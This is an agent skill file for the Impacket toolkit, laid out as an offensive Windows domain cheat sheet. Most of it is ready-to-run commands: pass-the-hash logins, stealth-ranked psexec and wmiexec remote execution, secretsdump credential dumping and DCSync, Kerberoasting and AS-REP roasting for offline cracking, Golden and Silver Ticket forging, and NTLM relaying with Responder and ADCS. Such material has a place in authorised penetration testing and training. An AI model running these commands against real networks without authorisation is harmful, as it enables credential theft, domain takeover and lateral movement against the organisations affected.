---
name: impacket-toolkit
description: "Impacket Windows protocol toolkit. Use when remote operations over Windows protocols such as SMB/Kerberos/WMI/DCOM/MSSQL are required. Covers secretsdump credential dumping, psexec/wmiexec remote execution, Kerberos attacks, and NTLM relaying, and is the foundational toolkit for domain penetration and Windows lateral movement"
zh-signals: "Impacket Windows 协议工具集，覆盖 secretsdump 凭据导出、psexec/wmiexec 远程执行、Kerberos 攻击与 NTLM 中继。信号:Impacket,secretsdump,psexec,NTLM中继,Kerberos,横向移动"
when-to-use: "Use when you need to operate over Windows protocols such as SMB/Kerberos/WMI/DCOM/MSSQL, including credential dumping, remote execution, Kerberos attacks, and NTLM relaying."
metadata:
  tags: "impacket,secretsdump,psexec,wmiexec,smbexec,dcomexec,ntlmrelayx,kerberos,smb,windows,domain,lateral-movement,credential,GetNPUsers,GetUserSPNs"
  category: "tool"
---

# Impacket Windows Protocol Toolkit

Impacket implements the Windows network protocol stack in pure Python, allowing you to operate against Windows targets directly from Linux—without installing anything on the target.

Project URL: https://github.com/fortra/impacket

## Authentication Methods

All Impacket tools support multiple authentication methods, and understanding these formats is important:

```bash
# Password authentication
tool.py DOMAIN/user:password@TARGET

# NTLM pass-the-hash (PtH)
tool.py DOMAIN/user@TARGET -hashes LM:NTLM
tool.py DOMAIN/user@TARGET -hashes :NTLM  # the LM part can be omitted

# Kerberos ticket authentication
export KRB5CCNAME=/tmp/user.ccache
tool.py DOMAIN/user@TARGET -k -no-pass

# Local user (not in the domain)
tool.py ./administrator:password@TARGET
```

## Remote Command Execution

Pick the most stable option, from non-interactive to fully interactive:

```bash
# psexec — executes by creating a service over SMB (most common, requires admin rights)
psexec.py DOMAIN/admin:password@TARGET
psexec.py DOMAIN/admin@TARGET -hashes :NTLM_HASH

# smbexec — executes over an SMB pipe (no binary upload, more stealthy)
smbexec.py DOMAIN/admin:password@TARGET

# wmiexec — executes via WMI (creates no service, most stealthy)
wmiexec.py DOMAIN/admin:password@TARGET

# dcomexec — executes via DCOM (alternative)
dcomexec.py DOMAIN/admin:password@TARGET

# atexec — executes via a scheduled task (no interactive shell required)
atexec.py DOMAIN/admin:password@TARGET "whoami"
```

### Selection Recommendations

| Tool | Protocol | Port | Stealth | Interactive |
|------|------|------|--------|--------|
| wmiexec | WMI/DCOM | 135 | ⭐⭐⭐ | ✅ |
| smbexec | SMB | 445 | ⭐⭐ | ✅ |
| psexec | SMB | 445 | ⭐ | ✅ |
| atexec | Scheduled task | 445 | ⭐⭐ | ❌ |
| dcomexec | DCOM | 135 | ⭐⭐ | ✅ |

## Credential Dumping

```bash
# secretsdump — the most important tool for domain penetration, dumps all credentials
# Remote dump (requires Domain Admin/local administrator)
secretsdump.py DOMAIN/admin:password@TARGET
secretsdump.py DOMAIN/admin@TARGET -hashes :NTLM_HASH

# Dump all domain user hashes on the DC (DCSync)
secretsdump.py DOMAIN/admin:password@DC_IP -just-dc

# Dump only NTLM (no Kerberos keys)
secretsdump.py DOMAIN/admin:password@DC_IP -just-dc-ntlm

# Dump from local SAM/SYSTEM files
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

## Kerberos Attacks

```bash
# AS-REP Roasting — find accounts that do not require pre-authentication
GetNPUsers.py DOMAIN/ -usersfile users.txt -no-pass -dc-ip DC_IP -format hashcat
# Feed the output to hashcat -m 18200

# Kerberoasting — obtain service tickets and crack them offline
GetUserSPNs.py DOMAIN/user:password -dc-ip DC_IP -request
# Feed the output to hashcat -m 13100

# Obtain a TGT
getTGT.py DOMAIN/user:password -dc-ip DC_IP
# Generates user.ccache → export KRB5CCNAME=user.ccache

# Obtain an ST (constrained delegation S4U abuse)
getST.py DOMAIN/svc_account:password -spn cifs/TARGET -impersonate administrator -dc-ip DC_IP
# -altservice can substitute the service type

# Silver Ticket
ticketer.py -nthash SERVICE_NTLM -domain-sid S-1-5-21-... -domain DOMAIN -spn cifs/TARGET user

# Golden Ticket
ticketer.py -nthash KRBTGT_NTLM -domain-sid S-1-5-21-... -domain DOMAIN -extra-sid S-1-5-21-PARENT-519 user
```

## Enumeration Tools

```bash
# SID enumeration (discover user/group RIDs)
lookupsid.py DOMAIN/user:password@TARGET

# RPC enumeration (exposed interfaces)
rpcdump.py DOMAIN/user:password@TARGET

# SAM user enumeration
samrdump.py DOMAIN/user:password@TARGET

# Remote registry operations
reg.py DOMAIN/admin:password@TARGET query -keyName HKLM\\SOFTWARE
```

## NTLM Relaying

```bash
# Relay to SMB (get a shell or run secretsdump)
ntlmrelayx.py -t smb://TARGET -smb2support
ntlmrelayx.py -t smb://TARGET -smb2support -c "whoami"

# Relay to LDAP (in-domain ACL modification)
ntlmrelayx.py -t ldap://DC_IP --escalate-user user

# Relay to ADCS Web Enrollment (ESC8)
ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp --adcs --template DomainController

# Use together with Responder
# Terminal 1: responder -I eth0 -wv (capture NTLM)
# Terminal 2: ntlmrelayx.py -t smb://TARGET (relay NTLM)
```

## SMB File Operations

```bash
# SMB client
smbclient.py DOMAIN/user:password@TARGET

# List shares
smbclient.py DOMAIN/user:password@TARGET -list

# Upload/download files
smbclient.py DOMAIN/user:password@TARGET
# > use SHARE_NAME
# > put local_file
# > get remote_file
```

## Decision Tree

```
What Windows operation do you need?
├─ Remote command execution → wmiexec (stealthy) / psexec (stable)
├─ Dump credentials/hashes → secretsdump
├─ Kerberos attacks → GetNPUsers / GetUserSPNs
├─ NTLM relaying → ntlmrelayx + Responder
├─ File operations → smbclient
├─ Have a password → use user:password directly
├─ Have an NTLM hash → -hashes :NTLM (PtH)
└─ Have a Kerberos ticket → -k -no-pass
```
